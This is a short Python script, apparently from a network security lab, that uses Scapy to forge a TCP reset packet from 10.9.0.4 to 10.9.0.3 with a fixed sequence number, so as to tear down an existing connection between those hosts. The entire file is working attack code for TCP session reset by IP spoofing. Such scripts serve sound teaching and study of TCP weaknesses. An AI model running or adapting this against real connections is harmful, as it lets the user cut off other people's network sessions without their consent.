#!usr/bin/python3
from scapy.all import *
import sys

print("Sending Spoofed RST Packet ...")
IP_Layer = IP(src="10.9.0.4", dst="10.9.0.3")
TCP_Layer = TCP(sport=1021,dport=512,flags="R", seq=647862699)
pkt = IP_Layer/TCP_Layer
send(pkt,verbose=0)
